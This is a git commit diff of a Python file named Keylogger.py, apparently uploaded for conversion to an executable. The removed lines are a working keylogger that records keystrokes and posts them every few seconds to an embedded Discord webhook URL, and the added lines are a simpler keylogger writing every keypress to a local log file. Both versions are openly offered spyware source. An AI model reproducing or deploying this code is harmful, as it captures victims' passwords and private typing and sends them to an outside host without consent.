e5deaa71716d89d84f318661a14bc127a8a3cb62
eroge-69 <erogexunamed@gmail.com>
2025-07-27 17:07:55 +0700

    Upload Keylogger.py via PY to EXE tool

--- python-files/Keylogger.py
+++ python-files/Keylogger.py
@@ -1,43 +1,18 @@
-import os
 from pynput import keyboard
-import requests
-import threading
 
-text = ""
-webhook_url = "https://discord.com/api/webhooks/1388415739765194833/GO_585plugFHPVH3eJgyOE4vA7O46V4gpePj8NBX_nRGuwGOoVSdDw2ScjvbK5KUR5k3" # put your webhook url here
-time_interval = 3
-
-def send_data():
-    data = {
-        "content": text,
-        "title": "Key Logger"
-    }
-    requests.post(webhook_url, json=data)
-    timer = threading.Timer(time_interval, send_data)
-    timer.start()
+# File jahan log save hoga
+log_file = "keylog.txt"
 
 def on_press(key):
-    global text
-    if key == keyboard.Key.space:
-        text += " "
-    elif key == keyboard.Key.enter:
-        text += "\n"
-    elif key == keyboard.Key.shift:
-        pass
-    elif key == keyboard.Key.tab:
-        text += "\t"
-    elif key == keyboard.Key.backspace:
-        if len(text) > 0:
-            text = text[:-1]
-        else:
-            pass
-    elif key == keyboard.Key.esc:
-        return False
-    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-        pass
-    else:
-        text += str(key).strip("'")
+    try:
+        key_data = f"Key {key.char} pressed\n"
+    except AttributeError:
+        key_data = f"Special key {key} pressed\n"
 
+    # Save to file
+    with open(log_file, "a") as f:
+        f.write(key_data)
+
+# Listener start karo
 with keyboard.Listener(on_press=on_press) as listener:
-    send_data()
     listener.join()
